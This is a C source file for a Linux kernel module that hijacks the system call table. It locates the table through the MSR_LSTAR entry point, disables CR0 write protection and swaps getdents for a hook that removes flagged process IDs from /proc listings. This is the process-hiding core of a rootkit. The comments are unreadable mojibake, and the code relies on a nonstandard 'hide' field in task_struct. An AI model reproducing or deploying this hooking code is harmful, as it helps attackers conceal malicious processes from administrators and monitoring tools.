#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/file.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");
#define DEBUG
unsigned long *sys_call_table = NULL;
asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);
/* ���ַ���ת��Ϊ������ʧ�ܷ���-1���ɹ����ش���-1������ */
int my_atoi(char * name)
{
	char *ptr;
	int tmp, pid = 0;
	int mul = 1;
	for (ptr = name + strlen(name) - 1; ptr >= name ; ptr--) {
		tmp = *ptr - '0';	
		if (tmp < 0 || tmp > 9) {
			pid = -1;
			break;
		}
		pid += tmp * mul;
		mul *= 10;	
	}
#ifdef DEBUG2
	printk(KERN_ALERT"name:%s,pid:%d", name, pid);
#endif
	return pid;
}
/* ���һ�������Ƿ�Ҫ������ */
int is_invisible(int pid)
{	
	int res = 0;
	if (pid >= 0)  {//is a process		
		struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
		if (task != NULL) {
			res = task->hide;//1 for invisible, 0 for visible
		}
#ifdef DEBUG2
		else
			printk(KERN_ALERT"PID:%d NO TASK\n", p_id);
#endif
	}
	return res;
}
/* �û��޸ĵ�ϵͳ����*/
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
	long res;
	int pid;
	unsigned short len = 0;
	unsigned short tlen = 0;
	struct kstat fbuf;
	vfs_fstat(fd, &fbuf);
	res = (*orig_getdents)(fd, dirp, count);
	if (!res)
		return res;
	if (res == -1)
		return res;
	if (fbuf.ino == PROC_ROOT_INO && !MAJOR(fbuf.dev) && MINOR(fbuf.dev) == 3) {
#ifdef DEBUG2
	printk(KERN_ALERT"proc file\n");
#endif
		tlen = res;
		while (tlen>0) {
			len = dirp->d_reclen;
#ifdef DEBUG2
			printk(KERN_ALERT"%s\n",(dirp->d_name-1));
#endif
			pid = my_atoi(dirp->d_name-1); //-1 is neccessary
			tlen -= len;
			if (is_invisible(pid)) {
			#ifdef DEBUG
				struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
				printk(KERN_ALERT"Find process:%s,pid:%d\n", task->comm, pid);
			#endif
				memmove(dirp, (char *)dirp + dirp->d_reclen, tlen);
				res -= len;
			}
			if (tlen)
				dirp = (struct linux_dirent64 *)((char *)dirp + dirp->d_reclen);
		}
	}
	return res;
}
/* �����ַ���*/
static void *memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
	const char *begin;
	const char *const last_possible = (const char *)haystack + haystack_len - needle_len;
	if (needle_len == 0) {
		return (void *)haystack;
	}
	if (__builtin_expect(haystack_len < needle_len, 0)) {
		return NULL;
	}
	for (begin = (const char *)haystack; begin <= last_possible; ++begin)
	{
		if (begin[0] == ((const char *)needle)[0] && !memcmp((const void *)&begin[1], (const void *)((const char *)needle + 1),needle_len - 1)) {
			return (void *)begin;
		}
	}
	return NULL;
}
/* ��ȡϵͳ���ñ��ַ*/
unsigned long* get_syscall_table_long(void) {
	char **p;
	/* Entry of syscall function */
	unsigned long sct_off = 0;
	unsigned char code[512];
	/* Obtain address of system_call */
	rdmsrl(MSR_LSTAR, sct_off);
	/* Read-in the code of system_call */
	memcpy(code, (void *)sct_off, sizeof(code));
	/* Search for pattern \xff\x14\xc5 */
	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
	if (p) //find
	{
		unsigned long *sct = *(unsigned long **)((char *)p + 3);
		//Stupid compiler doesn't want to do bitwise math on pointers
		sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);
		return sct;
	}
	else
		return NULL;
}
/* ����д���� */
inline unsigned long disable_wp(void)
{
	unsigned long cr0;
	preempt_disable(); //diable preempt
	barrier();
	cr0 = read_cr0();
	write_cr0(cr0 & ~X86_CR0_WP);
	return cr0;
}
/* �ָ�д����*/
inline void restore_wp(unsigned long cr0)
{
	write_cr0(cr0);
	barrier();
	preempt_enable_no_resched();
}
/* �ٳ�ϵͳ����ģ���ʼ������*/
static int __init hook_init(void) {
	unsigned long orig_cr0 = disable_wp(); //�ر�д����
	sys_call_table = get_syscall_table_long(); //���ϵͳ���ñ��ַ
	if (sys_call_table == 0) {
		printk(KERN_ALERT"sys_call_table is NULL!\n");
		return -1;
	}
#ifdef DEBUG
	printk(KERN_ALERT"Find system call table address:%p\n", sys_call_table);
#endif
	/* ����ԭʼϵͳ���� */
	orig_getdents = sys_call_table[__NR_getdents];
	/* �滻ԭʼϵͳ����*/
	sys_call_table[__NR_getdents] = hacked_getdents;
#ifdef DEBUG2
	orig_unhide = sys_call_table[__NR_unhide];
	sys_call_table[__NR_unhide] = hacked_unhide;
#endif
	restore_wp(orig_cr0); //�ָ�д����
	return 0;
}
/* �ٳ�ϵͳ����ģ��������*/
static void __exit hook_exit(void) {
	unsigned long orig_cr0 = disable_wp();
	/* �ָ�ϵͳ����*/
	sys_call_table[__NR_getdents] = orig_getdents;
#ifdef DEBUG2
	sys_call_table[__NR_unhide] = orig_unhide;
#endif
	restore_wp(orig_cr0);
	return;
}
module_init(hook_init);
module_exit(hook_exit);
